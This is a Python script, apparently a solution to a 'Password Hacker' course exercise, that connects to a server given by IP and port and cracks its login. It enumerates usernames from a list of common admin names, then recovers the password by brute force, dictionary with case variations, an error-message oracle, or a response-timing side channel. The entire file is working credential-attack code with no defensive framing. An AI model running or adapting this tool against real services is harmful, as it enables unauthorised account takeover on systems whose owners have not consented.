import socket
import argparse
import itertools
import json
from datetime import datetime

class PassHacker:
    n_pwhack = 0
    login = ''
    password = ''
    max_pass_length = 4
    password_dictionary_filename = "C:\\Users\\crv-it\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt"
    login_dictionary_filename = "C:\\Users\\crv-it\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt"
    logins_list = [
        'admin', 'Admin', 'admin1', 'admin2', 'admin3',
        'user1', 'user2', 'root', 'default', 'new_user',
        'some_user', 'new_admin', 'administrator',
        'Administrator', 'superuser', 'super', 'su', 'alex',
        'suser', 'rootuser', 'adminadmin', 'useruser',
        'superadmin', 'username', 'username1']

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("ipaddr", type=str, help="specify ip address")
        parser.add_argument("port", type=str, help="specify port")

        args = parser.parse_args()

        self.ip_address = args.ipaddr
        self.port = int(args.port)

        # self.ip_address = "localhost"
        # self.port = 9090

        self.mysocket = None
        self.response = None

    def __new__(cls, *args, **kwargs):
        if cls.n_pwhack == 0:
            cls.n_pwhack += 1
            return object.__new__(cls)
        return None

    def make_json_auth(self, login, password):
        return json.dumps({"login": login, "password": password})

    def read_json_response(self):
        self.receive_response()
        return json.loads(self.response.decode())['result']

    def create_socket(self):
        self.mysocket = socket.socket()

    def connect_socket(self):
        self.mysocket.connect((self.ip_address, self.port))

    def try_password(self, password):
        self.mysocket.send(password.encode())
        self.receive_response()
        return self.check_response()

    def receive_response(self):
        self.response = self.mysocket.recv(self.port)

    def print_response(self):
        print(self.response.decode())

    def check_response(self):
        if self.response.decode() == "Connection success!":
            return True
        return False

    def close_socket(self):
        self.mysocket.close()

    def hack(self, method='brute force'):
        if method == 'brute force':
            iterator = self.brute_force_password_generator()
        elif method == 'dictionary':
            iterator = self.dictionary_password_generator()
        for password in iterator:
            if self.try_password(password):
                self.password = password
                break

    def brute_force_password_generator(self):
        alphabet = set('abcdefghijklmnopqrstuvwxyz0123456789')
        for i in range(1, self.max_pass_length):
            for password_tuple in itertools.combinations_with_replacement(alphabet, i):
                yield "".join(password_tuple)

    def case_generator(self, word):
        for i in range(len(word)):
            for indexes in itertools.combinations(range(len(word)), i):
                lst = list(word)
                for index in indexes:
                    lst[index] = str(lst[index]).upper()
                yield "".join(lst)

    def dictionary_password_generator(self):
        with open(self.password_dictionary_filename, 'r') as password_dictionary:
            for base_password in password_dictionary:
                for password in self.case_generator(base_password.rstrip('\n')):
                    yield password

    def get_login(self):
        with open(self.login_dictionary_filename, 'r') as login_dictionary:
            for login in login_dictionary:
                self.mysocket.send(self.make_json_auth(login.rstrip('\n'), " "))
                self.receive_response()
                if self.read_json_response() != "Wrong login!":
                    self.login = login.rstrip('\n')
                    return True
        return False

    def get_login_from_list(self):
        for login in self.logins_list:
            self.mysocket.send(self.make_json_auth(login, " ").encode())
            if self.read_json_response() != "Wrong login!":
                self.login = login
                return True
        return False

    def use_exploit(self):
        alphabet = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
        password = ''
        pass_found = False
        while not pass_found:
            for ch in alphabet:
                password_temp = password + str(ch)
                if len(password_temp) > 10:
                    pass_found = True
                    break
                self.mysocket.send(self.make_json_auth(self.login, password_temp).encode())
                message = self.read_json_response()
                if message == "Exception happened during login":
                    password = password_temp
                    break
                if message == "Connection success!":
                    password = password_temp
                    pass_found = True
                    break
        self.password = password

    def use_time_vulnerability(self):
        alphabet = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
        password = ''
        pass_found = False
        while not pass_found:
            for ch in alphabet:
                password_temp = password + str(ch)
                if len(password_temp) > 10:
                    pass_found = True
                    break
                self.mysocket.send(self.make_json_auth(self.login, password_temp).encode())
                time_start = datetime.now()
                message = self.read_json_response()
                time_finish = datetime.now()
                if (time_finish - time_start).microseconds > 100000:
                    password = password_temp
                    break
                if message == "Connection success!":
                    password = password_temp
                    pass_found = True
                    break
        self.password = password

    def run(self):
        self.create_socket()
        self.connect_socket()
        if self.get_login_from_list():
            self.use_time_vulnerability()
        print(self.make_json_auth(self.login, self.password))
        self.close_socket()


def main():
    ph = PassHacker()
    ph.run()


if __name__ == '__main__':
    main()
